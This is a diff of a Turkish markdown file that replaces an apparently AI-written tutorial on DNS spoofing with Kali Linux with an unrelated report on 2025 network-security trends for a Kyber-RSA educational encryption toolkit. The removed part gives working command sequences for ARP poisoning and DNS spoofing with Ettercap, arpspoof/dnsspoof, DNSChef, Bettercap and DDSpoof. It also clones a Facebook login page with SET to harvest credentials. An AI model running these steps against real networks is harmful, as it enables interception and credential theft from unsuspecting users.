@@ -1,475 +1,170 @@
-# PROMPT
+# 2025 Yılı İçin Ağ Güvenliği Analizi: Öne Çıkan 10 Trend  
+**Kyber-RSASimToolkit Perspektifi**
 
-
-Find top 10 best tools and solutions to do this tasks:
-
-
-
-include platforms, usages, features, requirements
-
+2025 yılı, kuantum bilgisayarların potansiyel tehditleri ve siber saldırıların artan karmaşıklığıyla ağ güvenliğinde yeni bir dönemi işaret ediyor.  
+**Kyber-RSASimToolkit**, post-kuantum **CRYSTALS-Kyber** algoritması ile geleneksel **RSA** şifrelemesini birleştiren, eğitim odaklı bir **hibrit şifreleme aracıdır**.  
+Bu doküman, ağ güvenliği trendlerini Kyber-RSASimToolkit’in yetenekleri bağlamında inceleyerek, projenin deneysel ve öğrenme amaçlı kullanımını güçlendirecek öneriler sunar.
 
 ---
 
-DNS spoofing, bir ağda DNS sorgularını manipüle ederek kullanıcıları sahte bir web sitesine yönlendirmek için kullanılan bir siber saldırı yöntemidir. Kali Linux, bu tür saldırıları gerçekleştirmek için çeşitli araçlar sunar. Aşağıda, Kali Linux kullanarak DNS spoofing yapmanın tüm yaygın yöntemlerini ve bu süreçte kullanılan araçları detaylı bir şekilde listeledim. Bu bilgiler yalnızca eğitim amaçlıdır ve etik olmayan kullanımlar için uygun değildir. Herhangi bir ağda bu tür işlemleri yapmadan önce izin almanız gerektiğini unutmayın.
+## 1. Post-Kuantum Kriptografiye Geçiş ve Hibrit Şifreleme
 
+**Açıklama:**  
+Kuantum bilgisayarlar, **Shor algoritmasıyla** RSA gibi algoritmaları tehdit ediyor.  
+**NIST’in 2024’te onayladığı FIPS 203 (ML-KEM)** standardı, CRYSTALS-Kyber’ı post-kuantum anahtar kapsülleme mekanizması (KEM) olarak tanımlıyor.  
+Kyber-RSASimToolkit, Kyber ve RSA’yı birleştirerek kuantum-dirençli bir hibrit şifreleme sunuyor.
 
+**Tehditler ve Fırsatlar:**
+- NIST, 2030’a kadar kuantum-dirençli sistemlere geçişi öneriyor.
+- Hibrit şifreleme, eğitim ve deneysel amaçlı sistemler için ideal bir köprü sunar.
 
-### **Kali Linux ile DNS Spoofing Yöntemleri**
-
-
-
-#### **1. Ettercap ile DNS Spoofing**
-
-Ettercap, Kali Linux'ta yerleşik olarak bulunan güçlü bir man-in-the-middle (MITM) aracıdır ve DNS spoofing için sıkça kullanılır.
-
-
-
-**Adımlar:**
-
-1. **Ettercap Kurulumu ve Konfigürasyonu:**
-
-   - Ettercap genellikle Kali Linux’ta önceden yüklü gelir. Değilse, `sudo apt update && sudo apt install ettercap-graphical` komutuyla kurulabilir.
-
-   - Konfigürasyon dosyasını düzenlemek için: `sudo nano /etc/ettercap/etter.conf`
-
-   - Linux için iptables ayarlarını etkinleştirmek için dosya içindeki şu satırların başındaki `#` işaretini kaldırın:
-
-     ```
-
-     redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-ports %rport"
-
-     redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-ports %rport"
-
-     ```
-
-
-
-2. **Hedef Belirleme:**
-
-   - Terminalde `ettercap -G` komutuyla grafiksel arayüzü açın.
-
-   - Hedef IP adreslerini (örneğin, kurban ve ağ geçidi) belirlemek için: **Targets > Select Targets** seçeneğinden IP’leri girin.
-
-
-
-3. **ARP Poisoning:**
-
-   - **MitM > ARP Poisoning** seçeneğini tıklayın ve “Sniff remote connections” seçeneğini işaretleyin.
-
-   - Bu, ağdaki tüm trafiği sizin makinenize yönlendirecektir.
-
-
-
-4. **DNS Spoofing Aktivasyonu:**
-
-   - **Plugins > Manage Plugins** menüsünden `dns_spoof` eklentisini çift tıklayarak etkinleştirin.
-
-   - DNS yönlendirmeleri için `/etc/ettercap/etter.dns` dosyasını düzenleyin. Örneğin:
-
-     ```
-
-     facebook.com A 192.168.1.100
-
-     *.facebook.com A 192.168.1.100
-
-     ```
-
-     Burada `192.168.1.100`, sahte web sitesinin barındırıldığı IP adresidir (genellikle saldırganın makinesi).
-
-
-
-5. **Web Sunucusunu Başlatma:**
-
-   - Sahte bir web sitesi barındırmak için Apache sunucusunu başlatın: `sudo systemctl start apache2`
-
-   - Sahte web sayfasını `/var/www/html/index.html` dizinine yerleştirin.
-
-
-
-6. **Saldırıyı Başlatma:**
-
-   - Ettercap’te **Start > Start Sniffing** seçeneğini tıklayın.
-
-   - Artık hedef, `facebook.com` gibi bir siteye erişmeye çalıştığında sahte IP’ye yönlendirilecektir.
-
-
-
-**Kaynak:**,,[](https://www.amirootyet.com/post/how-to-spoof-dns-in-kali-linux/)[](https://www.kalilinux.in/2019/07/ettercap-dns-spoofing-in-kali-linux.html)[](https://infosecwriteups.com/how-i-pranked-my-friend-using-dns-spoofing-6a65ff01da1)
-
-
+**Öneri:**  
+- Kyber-RSASimToolkit, **FIPS 203 uyumlu Kyber implementasyonunu optimize etmeli**.  
+- RSA için **2048 ve 4096-bit** anahtar seçeneklerini destekleyerek eğitim senaryolarında esneklik sağlamalıdır.
 
 ---
 
+## 2. Yapay Zeka ile Şifreleme Zayıflık Analizi
 
+**Açıklama:**  
+Yapay zeka (YZ), şifreleme sistemlerinde **zayıflıkları** (örneğin, zayıf anahtarlar veya yanlış yapılandırmalar) tespit etmek için kullanılıyor.  
+Kyber-RSASimToolkit, YZ tabanlı testlerle şifreleme süreçlerini doğrulayabilir ve güvenli anahtar üretimi sağlayabilir.
 
-#### **2. Dnsspoof ile DNS Spoofing**
+**Tehditler ve Fırsatlar:**
+- YZ, sıfır gün şifreleme açıklarını hedefleyebilir.
+- Eğitim odaklı YZ testleri, şifreleme güvenilirliğini artırabilir.
 
-Dnsspoof, Dsniff paketinin bir parçasıdır ve basit bir şekilde DNS sorgularını spoof etmek için kullanılır.
-
-
-
-**Adımlar:**
-
-1. **Dnsspoof Kurulumu:**
-
-   - Dsniff paketi genellikle Kali’de yüklüdür. Değilse, `sudo apt install dsniff` ile kurun.
-
-
-
-2. **Hosts Dosyası Oluşturma:**
-
-   - `/usr/share/dsniff/dnsspoof.hosts` dosyasını oluşturun ve şu formatta düzenleyin:
-
-     ```
-
-     192.168.1.100 facebook.com
-
-     192.168.1.100 *.facebook.com
-
-     ```
-
-     Bu, tüm `facebook.com` sorgularını belirtilen IP’ye yönlendirir.
-
-
-
-3. **ARP Spoofing ile Trafik Yönlendirme:**
-
-   - Trafiği yönlendirmek için `arpspoof` kullanın:
-
-     ```
-
-     sudo arpspoof -i eth0 -t 192.168.1.11 192.168.1.1
-
-     sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.11
-
-     ```
-
-     Burada `192.168.1.11` kurban, `192.168.1.1` ağ geçidi ve `eth0` ağ arayüzüdür.
-
-
-
-4. **Dnsspoof Çalıştırma:**
-
-   - Aşağıdaki komutla dnsspoof’u başlatın:
-
-     ```
-
-     sudo dnsspoof -i eth0 -f /usr/share/dsniff/dnsspoof.hosts
-
-     ```
-
-   - Bu, belirtilen hosts dosyasına göre DNS sorgularını yönlendirecektir.
-
-
-
-5. **Web Sunucusu Kurulumu:**
-
-   - Apache’yi başlatın ve sahte web sayfasını `/var/www/html/` dizinine yerleştirin.
-
-
-
-**Not:** Dnsspoof’un çalışması için gerçek DNS yanıtından önce sahte yanıtın ulaşması gerekir. Bu nedenle ağda düşük gecikme önemlidir.,,[](https://null-byte.wonderhowto.com/how-to/hack-like-pro-spoof-dns-lan-redirect-traffic-your-fake-website-0151620/)[](https://security.stackexchange.com/questions/185389/dnsspoof-doesnt-spoof-dns-request-with-ip-address-of-local-machine)[](https://unix.stackexchange.com/questions/467701/dns-spoofing-in-kali-linux)
-
-
+**Öneri:**  
+- Anahtar gücü analizi için **basit bir YZ modülü (örneğin, entropi testi)** eklenmeli.
 
 ---
 
+## 3. Güvenli Anahtar Yönetimi ve Dağıtımı
 
+**Açıklama:**  
+Kyber’in KEM mekanizması güvenli anahtar paylaşımı sağlarken, RSA mevcut sistemlerle uyumluluğu koruyor.  
+Ancak karmaşık ağlarda anahtar saklama çözümleri eksik.
 
-#### **3. DNSChef ile DNS Spoofing**
+**Tehditler ve Fırsatlar:**
+- Anahtar sızıntıları, şifreleme güvenliğini riske atar.
+- Eğitim araçları, güvenli anahtar yönetimi farkındalığını artırabilir.
 
-DNSChef, DNS sorgularını özelleştirilmiş bir şekilde spoof etmek için kullanılan gelişmiş bir araçtır.
-
-
-
-**Adımlar:**
-
-1. **DNSChef Kurulumu:**
-
-   - DNSChef, Kali’de varsayılan olarak yüklü olmayabilir. Şu komutla kurun:
-
-     ```
-
-     sudo apt install dnschef
-
-     ```
-
-
-
-2. **DNSChef Konfigürasyonu:**
-
-   - DNSChef’i başlatmadan önce sahte DNS kayıtlarını tanımlayın. Örneğin:
-
-     ```
-
-     sudo dnschef --fakeip 192.168.1.100 --fakedomains facebook.com,www.facebook.com
-
-     ```
-
-     Bu, sadece belirtilen domainler için sahte IP’ye yönlendirme yapar. Diğer domainler gerçek DNS sunucusuna yönlendirilir.
-
-
-
-3. **Tüm DNS Sorgularını Spoof Etme:**
-
-   - Tüm DNS sorgularını sahte bir IP’ye yönlendirmek için:
-
-     ```
-
-     sudo dnschef --fakeip 192.168.1.100
-
-     ```
-
-
-
-4. **Hosts Dosyası Kullanımı:**
-
-   - Daha fazla özelleştirme için bir hosts dosyası oluşturun:
-
-     ```
-
-     echo "facebook.com=192.168.1.100" > dnschef_hosts.txt
-
-     ```
-
-   - Ardından DNSChef’i şu şekilde çalıştırın:
-
-     ```
-
-     sudo dnschef --file dnschef_hosts.txt
-
-     ```
-
-
-
-5. **IP Yönlendirme ve Web Sunucusu:**
-
-   - IP yönlendirmesini etkinleştirin: `sudo sysctl -w net.ipv4.ip_forward=1`
-
-   - Apache sunucusunu başlatın ve sahte sayfayı `/var/www/html/` dizinine yerleştirin.
-
-
-
-**Kaynak:**[](https://www.kali.org/tools/dnschef/)
-
-
+**Öneri:**  
+- Simüle edilmiş bir **anahtar kasası** ve **anahtar rotasyonu senaryoları** eklenmelidir.
 
 ---
 
+## 4. IoT Cihazları için Kuantum-Dirençli Şifreleme
 
+**Açıklama:**  
+2025’te 28 milyar IoT cihazının ağa bağlı olacağı öngörülüyor.  
+Kyber, düşük kaynak tüketimi sayesinde IoT cihazları için uygundur.
 
-#### **4. Bettercap ile DNS Spoofing**
+**Tehditler ve Fırsatlar:**
+- IoT cihazları, zayıf şifreleme nedeniyle kolay hedeflerdir.
+- Kyber, IoT şifreleme simülasyonları için idealdir.
 
-Bettercap, modern ve esnek bir MITM aracıdır ve DNS spoofing için güçlü bir seçenektir.
-
-
-
-**Adımlar:**
-
-1. **Bettercap Kurulumu:**
-
-   - Bettercap genellikle Kali’de yüklüdür. Değilse: `sudo apt install bettercap`
-
-
-
-2. **IP Yönlendirme Aktivasyonu:**
-
-   - `sudo sysctl -w net.ipv4.ip_forward=1`
-
-
-
-3. **Hedef ve Gateway Belirleme:**
-
-   - Ağ arayüzünü ve hedefleri belirlemek için:
-
-     ```
-
-     sudo bettercap -iface eth0
-
-     ```
-
-   - Bettercap arayüzünde şu komutları kullanın:
-
-     ```
-
-     set arp.spoof.targets 192.168.1.11
-
-     set dns.spoof.domains facebook.com,*.facebook.com
-
-     set dns.spoof.address 192.168.1.100
-
-     ```
-
-
-
-4. **Saldırıyı Başlatma:**
-
-   - ARP spoofing ve DNS spoofing modüllerini etkinleştirin:
-
-     ```
-
-     arp.spoof on
-
-     dns.spoof on
-
-     ```
-
-
-
-5. **Web Sunucusunu Başlatma:**
-
-   - Apache’yi başlatın ve sahte web sayfasını `/var/www/html/` dizinine yerleştirin.
-
-
-
-6. **Saldırıyı Sonlandırma:**
-
-   - Saldırıyı durdurmak için: `dns.spoof off; arp.spoof off`
-
-
-
-**Kaynak:**,[](https://medium.com/%40sebastienwebdev/dns-spoofer-f337bb85c567)[](https://le-guide-du-secops.fr/2020/04/28/attaque-dns-spoofing-theorie-et-mise-en-pratique/)
-
-
+**Öneri:**  
+- **Kyber512 modülü** ve **düşük bant genişliği protokolleri için test senaryoları** eklenmeli.
 
 ---
 
+## 5. Bulut Ortamlarında Hibrit Şifreleme
 
+**Açıklama:**  
+Kyber-RSASimToolkit, bulut tabanlı uygulamalarda hibrit şifreleme sunar.  
+Ancak, bulut ortamlarında dinamik anahtar yönetimi testleri eksiktir.
 
-#### **5. DDSpoof ile DHCP DNS Spoofing**
+**Tehditler ve Fırsatlar:**
+- Bulut veri ihlalleri, zayıf şifrelemeden kaynaklanıyor.
+- Hibrit şifreleme, bulut güvenliği eğitimini güçlendirebilir.
 
-DDSpoof, DHCP protokolünü kullanarak DNS spoofing yapmak için özel bir araçtır. DHCP sunucularını manipüle ederek DNS kayıtlarını spoof eder.
-
-
-
-**Adımlar:**
-
-1. **DDSpoof Kurulumu:**
-
-   - DDSpoof’u GitHub’dan indirin: `git clone https://github.com/akamai/ddspoof`
-
-   - Gerekli bağımlılıkları yükleyin: `pip install -r requirements.txt`
-
-
-
-2. **Ağ Taraması:**
-
-   - Ağdaki DHCP sunucularını tespit edin:
-
-     ```
-
-     sudo python3 ddspoof.py --interface eth0 --scan
-
-     ```
-
-
-
-3. **DHCP DNS Saldırısı:**
-
-   - DHCP sunucusunu spoof etmek için:
-
-     ```
-
-     sudo python3 ddspoof.py --interface eth0 --dns 192.168.1.100
-
-     ```
-
-   - Bu, istemcilere sahte DNS sunucusu IP’si atar.
-
-
-
-4. **Sahte Web Sitesi Kurulumu:**
-
-   - Apache veya başka bir web sunucusunu kullanarak sahte bir siteyi barındırın.
-
-
-
-**Kaynak:**[](https://www.akamai.com/blog/security-research/weaponizing-dhcp-dns-spoofing-hands-on-guide)
-
-
+**Öneri:**  
+- Bulut API’leri (örneğin, **AWS KMS**) için simüle edilmiş testler ve ölçeklenebilir senaryolar eklenmeli.
 
 ---
 
+## 6. API Güvenliği için Kuantum-Dirençli Protokoller
 
+**Açıklama:**  
+Kyber’in KEM mekanizması, API iletişimlerini güvenli hale getirebilir.  
+RSA ile hibrit yapı, mevcut TLS altyapısıyla uyumludur.
 
-#### **6. Social Engineering Toolkit (SET) ile DNS Spoofing**
+**Tehditler ve Fırsatlar:**
+- Zayıf API şifrelemesi, veri sızıntılarına yol açar.
+- Kyber, kuantum-dirençli TLS sunabilir.
 
-SET, sosyal mühendislik saldırıları için kullanılır ve DNS spoofing ile birlikte phishing sayfaları oluşturmak için idealdir.
-
-
-
-**Adımlar:**
-
-1. **SET Başlatma:**
-
-   - Terminalde `sudo setoolkit` komutunu çalıştırın.
-
-   - Menüden **Social Engineering Attacks > Website Attack Vectors > Credential Harvester Attack Method > Site Cloner** seçeneğini seçin.
-
-
-
-2. **Sahte Web Sitesi Oluşturma:**
-
-   - Hedef web sitesini (örneğin, `facebook.com`) kopyalamak için URL’yi girin.
-
-   - SET, sahte bir web sayfasını otomatik olarak oluşturur ve Apache sunucusuna yerleştirir.
-
-
-
-3. **DNS Spoofing ile Entegrasyon:**
-
-   - Yukarıdaki araçlardan biri (örneğin, Ettercap veya Bettercap) ile DNS spoofing yaparak trafiği sahte siteye yönlendirin.
-
-
-
-**Kaynak:**[](https://www.amirootyet.com/post/how-to-spoof-dns-in-kali-linux/)
-
-
+**Öneri:**  
+- TLS 1.3 tabanlı **hibrit şifreleme simülasyonları** ve **API uç nokta tarama araçları** eklenmelidir.
 
 ---
 
+## 7. Yan Kanal Saldırılarına Karşı Savunma
 
+**Açıklama:**  
+Kyber-RSASimToolkit’in kyber-py implementasyonu zamanlama ve güç analizi gibi yan kanal saldırılarına karşı hassastır.
 
-### **Ek Notlar ve Dikkat Edilmesi Gerekenler**
+**Tehditler ve Fırsatlar:**
+- Yan kanal saldırıları, anahtarları tehlikeye atabilir.
+- Simülasyonlar, bu tehditleri öğretmede etkilidir.
 
-- **HTTPS Kısıtlamaları:** HTTPS kullanan sitelerde DNS spoofing yapmak daha zordur çünkü SSL sertifikaları sahte siteleri tespit edebilir. Bunun için ek olarak `sslstrip` veya sahte bir SSL sertifikası kullanılabilir, ancak bu kullanıcıda uyarı mesajlarına neden olabilir.[](https://www.infosecinstitute.com/resources/penetration-testing/kali-linux-top-5-tools-for-sniffing-and-spoofing/)
+**Öneri:**  
+- **Sabit zamanlı işlemler için test modülü** ve **yan kanal saldırı simülasyonları** eklenmelidir.
 
-- **Ağ Gereksinimleri:** DNS spoofing genellikle yerel ağda (LAN) çalışır ve saldırganın hedefle aynı ağda olması gerekir.[](https://null-byte.wonderhowto.com/how-to/hack-like-pro-spoof-dns-lan-redirect-traffic-your-fake-website-0151620/)
+---
 
-- **Etik ve Yasal Hususlar:** DNS spoofing, izinsiz yapıldığında yasa dışıdır ve ciddi etik sorunlar doğurur. Sadece test ortamlarında ve izinle kullanın.[](https://research.uaeu.ac.ae/en/publications/teaching-dns-spoofing-attack-using-a-hands-on-cybersecurity-appro)
+## 8. Tedarik Zinciri Güvenliği için Şifreleme Denetimi
 
-- **Korunma Yöntemleri:**
+**Açıklama:**  
+Tedarik zinciri saldırıları, şifreleme kütüphanelerini hedef alabilir.  
+Kyber-RSASimToolkit, pycryptodome ve kyber-py gibi bağımlılıkları denetleyebilir.
 
-  - DNSSEC kullanarak DNS sorgularını doğrulayın.
+**Tehditler ve Fırsatlar:**
+- Zayıf bağımlılıklar sistem güvenliğini riske atar.
+- Denetimler, güvenilirliği artırır.
 
-  - HTTPS kullanın ve sertifika uyarılarını dikkate alın.
+**Öneri:**  
+- **Dependabot** benzeri araçlarla bağımlılık tarama ve açık kaynak kütüphane denetimi modülleri eklenmelidir.
 
-  - ARP spoofing tespit araçları (örneğin, Snort) kullanın.[](https://null-byte.wonderhowto.com/how-to/tutorial-dns-spoofing-0167796/)
+---
 
+## 9. Gerçek Zamanlı Şifreleme Doğrulama
 
+**Açıklama:**  
+Kyber-RSASimToolkit, KAT dosyalarıyla doğrulama yapar. Ancak dinamik testler eksiktir.
 
-### **Özet**
+**Tehditler ve Fırsatlar:**
+- Sıfır gün açıkları, şifrelemeyi etkisiz hale getirebilir.
+- Gerçek zamanlı testler eğitimde güvenilirlik sağlar.
 
-Kali Linux’ta DNS spoofing için kullanılan başlıca araçlar **Ettercap**, **Dnsspoof**, **DNSChef**, **Bettercap**, **DDSpoof** ve **SET**’tir. Her bir araç farklı senaryolara uygun özellikler sunar:
+**Öneri:**  
+- **Gerçek zamanlı doğrulama simülasyonları** ve **YZ tabanlı anomali tespit modülü** eklenmelidir.
 
-- **Ettercap**: Kolay kullanım ve grafiksel arayüz.
+---
 
-- **Dnsspoof**: Basit ve hızlı, ancak hosts dosyası gerektirir.
+## 10. Kullanıcı Dostu Öğretim Arayüzleri
 
-- **DNSChef**: Esnek ve özelleştirilebilir.
+**Açıklama:**  
+Kyber-RSASimToolkit CLI ve Tkinter GUI sunuyor, fakat modern eğitim gereksinimleri daha sezgisel çözümler gerektiriyor.
 
-- **Bettercap**: Modern ve çok yönlü.
+**Tehditler ve Fırsatlar:**
+- Karmaşık arayüzler, öğrenmeyi zorlaştırır.
+- Sezgisel arayüzler, kullanıcı katılımını artırır.
 
-- **DDSpoof**: DHCP tabanlı saldırılar için özel.
+**Öneri:**  
+- **Flask ile hafif web arayüzü**, gelişmiş **hata mesajları** ve **interaktif rehberler** sunulmalıdır.
 
-- **SET**: Phishing ile entegre.
+---
 
+## Sonuç ve Öneriler
 
+2025’in ağ güvenliği ortamı, kuantum tehditleri ve YZ tabanlı saldırılarla şekilleniyor.  
+**Kyber-RSASimToolkit**, eğitim odaklı bir araç olarak şu geliştirmelerle öne çıkabilir:
 
-Her yöntemin başarısı, ağ ortamına, hedefin güvenlik önlemlerine ve saldırganın hazırlığına bağlıdır. Bu teknikleri yalnızca eğitim veya izinli penetrasyon testleri için kullanmanız gerektiğini tekrar hatırlatırım.
+- **Post-Kuantum Optimizasyonu:** FIPS-203 uyumlu Kyber implementasyonu  
+- **YZ ile Öğrenme:** Şifreleme zayıflık testi için YZ modülleri  
+- **IoT ve Bulut Desteği:** Hafif ve ölçeklenebilir şifreleme simülasyonları  
+- **Güvenli Anahtar Yönetimi:** Simüle edilmiş HSM ve rotasyon senaryoları  
+- **Kullanıcı Deneyimi:** Modern web tabanlı arayüz ve rehberler  
 
-
-
-
-
-
+> Bu trendlerin entegrasyonu, **Kyber-RSASimToolkit’i**, 2025 ve sonrasında kuantum-dirençli şifreleme eğitiminde lider bir araç haline getirecektir.
